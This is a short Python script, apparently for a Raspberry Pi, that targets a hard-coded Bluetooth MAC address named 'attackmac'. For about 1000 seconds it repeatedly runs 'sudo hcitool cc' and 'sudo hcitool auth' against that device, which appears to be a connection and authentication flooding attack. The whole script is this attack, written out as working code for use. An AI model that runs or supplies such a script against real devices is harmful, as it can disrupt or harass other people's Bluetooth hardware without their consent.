import time
import os

# path = '/home/pi/mac.txt'
# mac_file = open(path, 'r')
# attackmac = mac_file.read()
attackmac='D4:8A:39:34:73:FD'
# path = '/home/pi/attacktime.txt'
# atk_file = open(path, 'r')
# attacktime = atk_file.read()
# attacktimeint = int(attacktime)

timeout = time.time() + 1000
while True:
    os.system("sudo hcitool cc --role=m "+ attackmac)
    os.system("sudo hcitool auth "+ attackmac )
    if time.time() > timeout:
        break